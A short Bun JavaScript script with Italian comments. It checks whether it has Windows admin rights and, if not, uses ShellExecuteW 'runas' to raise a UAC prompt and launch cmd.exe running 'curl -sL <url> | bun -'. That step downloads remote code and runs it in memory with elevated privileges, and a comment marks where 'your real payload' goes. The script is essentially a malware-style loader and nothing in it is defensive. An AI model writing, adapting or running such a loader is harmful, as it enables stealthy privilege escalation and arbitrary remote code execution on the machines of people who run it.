// admin-loop.js
// IMPORTANTE: In ESM non esiste require, usiamo await import
const { dlopen, FFIType, ptr } = await import("bun:ffi");

const shell32 = dlopen("shell32.dll", {
  ShellExecuteW: {
    args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
    returns: FFIType.i32,
  },
});

const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

async function isAdmin() {
  try {
    const p = Bun.spawn({ cmd: ["net", "session"], stdout: "pipe", stderr: "pipe" });
    return (await p.exited) === 0;
  } catch (e) { return false; }
}

(async () => {
  const admin = await isAdmin();
  console.log(`🚀 PID: ${process.pid} | Admin: ${admin}`);

  if (admin) {
    console.log("✅ LIVELLO ADMIN RAGGIUNTO!");
    // Esegui qui il tuo payload reale
    const { stdout } = Bun.spawn({ cmd: ["whoami"] });
    console.log("Utente:", await new Response(stdout).text());
    
    console.log("\nFinestra attiva. Premi INVIO per chiudere...");
    for await (const line of console) break; 
    return;
  }

  console.log("❌ Permessi insufficienti. Richiesta UAC in corso...");

  // Comando ricorsivo: scarica ed esegue in RAM nel nuovo processo
  const url = "https://githubusercontent.com";
  // Usiamo /k invece di /c per tenere aperto il CMD in caso di errore
  const payload = `curl -sL ${url} | bun -`;

  const res = shell32.symbols.ShellExecuteW(
    0,
    toPtr("runas"),
    toPtr("cmd.exe"),
    toPtr("/k " + payload), 
    0,
    1
  );

  console.log("Risultato ShellExecuteW:", res);
  if (res > 32) process.exit(0);
})();
